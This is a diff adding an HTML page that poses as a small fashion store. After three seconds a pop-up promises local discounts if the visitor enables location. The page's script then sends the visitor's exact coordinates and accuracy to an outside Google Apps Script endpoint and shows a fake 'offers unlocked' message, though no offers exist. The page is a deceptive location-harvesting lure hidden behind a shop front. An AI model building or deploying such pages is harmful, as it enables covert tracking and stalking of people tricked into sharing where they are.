@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Trendy Fashions</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f8f9fa;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background-color: #e91e63;
+      color: white;
+      padding: 15px;
+      text-align: center;
+      font-size: 24px;
+    }
+    .products {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 15px;
+      padding: 20px;
+    }
+    .product {
+      background-color: white;
+      padding: 10px;
+      border-radius: 10px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .product img {
+      width: 100%;
+      border-radius: 10px;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+    .modal-content {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      text-align: center;
+      max-width: 300px;
+    }
+    .modal-content h3 {
+      margin-bottom: 10px;
+    }
+    .modal-content button {
+      background-color: #e91e63;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<header>Trendy Fashions</header>
+
+<div class="products">
+  <div class="product">
+    <img src="https://via.placeholder.com/200x200?text=Dress+1" alt="Dress 1">
+    <p>Summer Floral Dress</p>
+  </div>
+  <div class="product">
+    <img src="https://via.placeholder.com/200x200?text=Dress+2" alt="Dress 2">
+    <p>Casual Pink Frock</p>
+  </div>
+  <div class="product">
+    <img src="https://via.placeholder.com/200x200?text=Dress+3" alt="Dress 3">
+    <p>Classic Black Gown</p>
+  </div>
+  <div class="product">
+    <img src="https://via.placeholder.com/200x200?text=Dress+4" alt="Dress 4">
+    <p>Ethnic Wear Set</p>
+  </div>
+</div>
+
+<!-- Location Modal -->
+<div class="modal" id="locationModal">
+  <div class="modal-content">
+    <h3>🎁 Nearby Offers Available!</h3>
+    <p>Enable location to unlock special discounts near you.</p>
+    <button onclick="shareLocation()">Unlock</button>
+  </div>
+</div>
+
+<script>
+  // Show modal after 3 seconds
+  setTimeout(() => {
+    document.getElementById("locationModal").style.display = "flex";
+  }, 3000);
+
+  function shareLocation() {
+    if (!navigator.geolocation) {
+      alert('Geolocation not supported.');
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const data = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy
+      };
+
+      fetch("https://script.google.com/home/projects/1v3ouiYwbLB8pM-cQPFYDAG8WxV80QNJg4z2rV5-XGQHy8h-kaHpN25uS/edit", {
+        method: "POST",
+        body: JSON.stringify(data),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      }).then(() => {
+        alert("✅ Offers unlocked based on your area!");
+        document.getElementById("locationModal").style.display = "none";
+      }).catch(() => {
+        alert("Failed to send location.");
+      });
+
+    }, function() {
+      alert('❌ Permission denied or error.');
+    });
+  }
+</script>
+
+</body>
+</html>
